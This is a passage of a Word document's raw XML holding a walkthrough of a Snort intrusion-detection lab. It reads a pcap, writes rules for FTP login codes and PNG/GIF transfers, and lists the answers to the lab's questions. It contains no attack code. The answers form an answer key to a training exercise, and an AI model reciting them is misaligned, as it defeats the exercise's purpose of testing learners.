    <w:p w14:paraId="626A6621" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>- 216.239.59.99</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="040D2FA1" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t> What is the ACK number of packet 64? (Same concept with the command, but switching the packet number)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08E8DA9B" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t> - 0x2E6B5384</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="597CB106" w14:textId="77777777" w:rsidR="00CA3B80" w:rsidRDefault="00CA3B80" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="591CFFD9" w14:textId="696C80D9" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">What is the SEQ number of </w:t>
      </w:r>
      <w:r w:rsidR="00FA6FE2">
        <w:t>packets</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 62?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="489004F8" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>- 0x36C21E28</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E1CBC93" w14:textId="77777777" w:rsidR="00CA3B80" w:rsidRDefault="00CA3B80" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2F900C1C" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>What is the TTL of packet 65?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="442D6CE2" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>- 128</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="324C766C" w14:textId="77777777" w:rsidR="00CA3B80" w:rsidRDefault="00CA3B80" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C635120" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>What is the source IP of packet 65?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="592BF8D6" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>- 145.254.160.237</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50C334E3" w14:textId="77777777" w:rsidR="00CA3B80" w:rsidRDefault="00CA3B80" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2AC870B4" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>What is the source port of packet 65?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53FD0F2B" w14:textId="3B91A307" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>- 3372</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E3BD10C" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="47CF74DA" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Task 3: Writing IDS Rules (FTP)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CC2B193" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="54234133" w14:textId="0506DEAF" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Now, we will detect traffic for TCP port 21 from the given </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>pcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">. We will use the same </w:t>
      </w:r>
      <w:r w:rsidR="00CA3B80">
        <w:t>command but</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> alter it to fit the requirements for this task.</w:t>
      </w:r>
      <w:r w:rsidR="00CA3B80">
        <w:t xml:space="preserve"> Change the directory to Task 3. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67891179" w14:textId="5E403560" w:rsidR="00261C8C" w:rsidRDefault="00CA3B80" w:rsidP="00CA3B80">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="53805E51" wp14:editId="19D0083B">
            <wp:extent cx="4572000" cy="266700"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="4722100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66700"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7165C850" w14:textId="39272CFB" w:rsidR="00CA3B80" w:rsidRDefault="00CA3B80" w:rsidP="00CA3B80">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3.4: The rule that was created for detecting traffic through TCP Port 21</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="107047E5" w14:textId="1A757167" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Run "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sudo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> snort -r ftp-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>png</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>gif.pcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> -c </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>local.rules</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> -A full -</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>l .</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E82D61D" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3C5CD9AC" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>What is the number of detected packets?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51176BBB" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>- 307</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57960009" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="308C4445" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>View the log file with "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sudo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> snort -r snort.log.1740004484 -X".</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1023CD3B" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="488512D2" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>What is the FTP service name?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="342FD995" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>- Microsoft FTP service</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="666602FC" w14:textId="77777777" w:rsidR="00CA3B80" w:rsidRDefault="00CA3B80" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4A26A95A" w14:textId="6CC55DA2" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>We will be using this command:"</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sudo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> snort -r ftp-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>png</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>gif.pcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> -c </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>local.rules</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> -A full -</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>l .</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>".</w:t>
      </w:r>
      <w:r w:rsidR="00CA3B80">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Clear the previous log and alarm files. Deactivate/comment on the old rules. Write a rule to detect failed FTP login attempts in the given </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>pcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>.  530 is the content code for failed FTP login attempts. The new rule should now be:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="483BB218" w14:textId="7A2913E1" w:rsidR="00261C8C" w:rsidRDefault="00666929" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="14EC93A1" wp14:editId="52E848C0">
            <wp:extent cx="5478780" cy="213360"/>
            <wp:effectExtent l="0" t="0" r="7620" b="0"/>
            <wp:docPr id="16021643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213360"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="75984FB0" w14:textId="1BD4C2E5" w:rsidR="00666929" w:rsidRDefault="00666929" w:rsidP="00666929">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3.5: The rule that was created for detecting failed FTP login attempts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="352C18BD" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>What is the number of detected packets? (It is found in the Alerts under actions)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77BDD237" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>- 41</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="245DB229" w14:textId="77777777" w:rsidR="00666929" w:rsidRDefault="00666929" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3830005E" w14:textId="492E77F2" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Clear the previous log and alarm files. Deactivate/comment on the old rule. Write a rule to detect successful FTP logins in the given </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>pcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>. 230 is the content code for successful login attempts.</w:t>
      </w:r>
      <w:r w:rsidR="00666929">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>What is the number of detected packets?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="248AE919" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>- 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="522FDB16" w14:textId="77777777" w:rsidR="00666929" w:rsidRDefault="00666929" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="778DB593" w14:textId="1AC73257" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Clear the previous log and alarm files. Deactivate/comment on the old rule. Write a rule to detect FTP login attempts with a valid username but no password </w:t>
      </w:r>
      <w:r w:rsidR="00666929">
        <w:t>has entered</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> yet.  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="127BC0E4" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>What is the number of detected packets? 331 is the content code for this required task.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30A3AFB0" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>- 42</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1297CA02" w14:textId="78ABED22" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6D1D1BFB" w14:textId="44EB8A7F" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Clear the previous log and alarm files. Deactivate/comment on the old rule. Write a rule to detect FTP login attempts with the "Administrator" username but no password </w:t>
      </w:r>
      <w:r w:rsidR="00666929">
        <w:t>has entered</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> yet. 331 will still be used, with the addition of "Administrator".</w:t>
      </w:r>
      <w:r w:rsidR="00666929">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>What is the number of detected packets?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10C76D83" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>- 7</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0070B1B6" w14:textId="06D6E45B" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7E5E385A" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Task 4: Writing IDS Rules (PNG)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FA4DF76" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="731DA687" w14:textId="389B8104" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00666929">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Change the directory to Task 4. We will write a rule in the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>local.rules</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> file to detect PNGs.</w:t>
      </w:r>
      <w:r w:rsidR="00666929">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="40B15816" wp14:editId="6E45F699">
            <wp:extent cx="5486400" cy="335280"/>
            <wp:effectExtent l="0" t="0" r="0" b="7620"/>
            <wp:docPr id="6497550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5280"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DC20015" w14:textId="4AD41831" w:rsidR="00666929" w:rsidRDefault="00666929" w:rsidP="00666929">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3.6: The rule that was created for detecting PNG files</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5816D07C" w14:textId="2EC3ACF8" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Run the "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sudo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> snort -r ftp-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>png</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>gif.pcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> -c </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>local.rules</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>l .</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t>" command. We will now check the log file: "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>sudo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> snort -r snort.log.1740009323 -X".</w:t>
      </w:r>
      <w:r w:rsidR="00666929">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Investigate the logs and identify the software name embedded in the packet.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E4918A8" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>- Adobe Image Ready</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5543EFA6" w14:textId="0F125ED8" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7307F5BC" w14:textId="1DD53AD0" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Clear the previous log and alarm files. Deactivate/comment on the old rule. Write a rule to detect the GIF file in the given </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>pcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>. We will now change "PNG" to "GIF" in the rule.</w:t>
      </w:r>
      <w:r w:rsidR="00666929">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Investigate the logs and identify the image format embedded in the packet.</w:t>
      </w:r>
    </w:p>
